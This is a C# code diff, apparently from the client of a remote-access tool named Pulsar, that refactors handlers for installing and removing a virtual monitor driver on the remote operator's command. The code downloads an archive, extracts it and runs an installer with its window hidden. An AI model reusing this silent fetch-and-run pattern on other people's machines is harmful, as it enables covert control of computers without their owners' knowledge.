@@ -750,83 +750,87 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, DoInstallVirtualMonitor message)
         {
-            string downloadURL = "https://www.amyuni.com/downloads/usbmmidd_v2.zip";
-            string dropPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2.zip");
-
-            // download the virtual monitor driver
-            if (!File.Exists(dropPath))
+            try
             {
-                try
+                string downloadURL = "https://www.amyuni.com/downloads/usbmmidd_v2.zip";
+                string dropPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2.zip");
+
+                if (!File.Exists(dropPath))
                 {
                     using (var wc = new System.Net.WebClient())
-                    {
                         wc.DownloadFile(downloadURL, dropPath);
-                    }
                 }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"Error downloading virtual monitor driver: {ex.Message}");
-                    return;
-                }
-            }
 
-            // extract the driver
-            string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2");
-            if (!Directory.Exists(extractPath))
-            {
-                try
-                {
+                string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2");
+                if (!Directory.Exists(extractPath))
                     System.IO.Compression.ZipFile.ExtractToDirectory(dropPath, extractPath);
-                }
-                catch (Exception ex)
-                {
-                    Debug.WriteLine($"Error extracting virtual monitor driver: {ex.Message}");
-                    return;
-                }
+
+                string root = Path.Combine(extractPath, "usbmmidd_v2");
+                string installPath = Path.Combine(root, "deviceinstaller64.exe");
+                if (!File.Exists(installPath))
+                    throw new FileNotFoundException("Virtual monitor installer was not found.", installPath);
+
+                RunVirtualMonitorInstaller(installPath,
+                    $"install {Path.Combine(root, "usbmmIdd.inf")} usbmmidd");
+                RunVirtualMonitorInstaller(installPath, "enableidd 1");
+
+                client.Send(new DoInstallVirtualMonitorResponse { Success = true });
             }
-
-            extractPath = Path.Combine(extractPath, "usbmmidd_v2");
-
-            // deviceinstaller64.exe install usbmmIdd.inf usbmmidd
-            // deviceinstaller64.exe enableidd 1
-
-            // install the driver
-            string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
-            string arguments = $"install {Path.Combine(extractPath, "usbmmIdd.inf")} usbmmidd";
-            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments);
-            psi.UseShellExecute = false;
-            psi.RedirectStandardOutput = true;
-            psi.CreateNoWindow = true;
-            psi.RedirectStandardError = true;
-
-            Process p = Process.Start(psi);
-            p.WaitForExit();
-
-            // enable the driver
-            arguments = "enableidd 1";
-            psi = new ProcessStartInfo(installPath, arguments);
-            psi.UseShellExecute = false;
-            psi.RedirectStandardOutput = true;
-            psi.CreateNoWindow = true;
-            psi.RedirectStandardError = true;
-
-            p = Process.Start(psi);
-            p.WaitForExit();
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Virtual monitor install failed: {ex.Message}");
+                client.Send(new DoInstallVirtualMonitorResponse
+                {
+                    Success = false,
+                    Error = ex.Message
+                });
+            }
         }
 
         private void Execute(ISender client, DoUninstallVirtualMonitor message)
         {
-            string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2", "usbmmidd_v2");
-            string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
-            // disable the driver
-            string arguments = "enableidd 0";
-            ProcessStartInfo psi = new ProcessStartInfo(installPath, arguments);
-            psi.UseShellExecute = false;
-            psi.RedirectStandardOutput = true;
-            psi.CreateNoWindow = true;
-            psi.RedirectStandardError = true;
-            Process p = Process.Start(psi);
-            p.WaitForExit();
+            try
+            {
+                string extractPath = Path.Combine(Settings.DIRECTORY, "usbmmidd_v2", "usbmmidd_v2");
+                string installPath = Path.Combine(extractPath, "deviceinstaller64.exe");
+                if (!File.Exists(installPath))
+                    throw new FileNotFoundException("Virtual monitor installer was not found.", installPath);
+
+                RunVirtualMonitorInstaller(installPath, "enableidd 0");
+                client.Send(new DoUninstallVirtualMonitorResponse { Success = true });
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Virtual monitor uninstall failed: {ex.Message}");
+                client.Send(new DoUninstallVirtualMonitorResponse
+                {
+                    Success = false,
+                    Error = ex.Message
+                });
+            }
+        }
+
+        private static void RunVirtualMonitorInstaller(string installPath, string arguments)
+        {
+            var psi = new ProcessStartInfo(installPath, arguments)
+            {
+                UseShellExecute = false,
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                CreateNoWindow = true
+            };
+
+            using (var process = Process.Start(psi))
+            {
+                if (process == null)
+                    throw new InvalidOperationException("Virtual monitor installer could not be started.");
+
+                process.WaitForExit();
+                if (process.ExitCode != 0)
+                    throw new InvalidOperationException(
+                        $"Virtual monitor installer exited with code {process.ExitCode}: " +
+                        process.StandardError.ReadToEnd().Trim());
+            }
         }
 
         private void Execute(ISender client, StartProcessOnMonitor message)
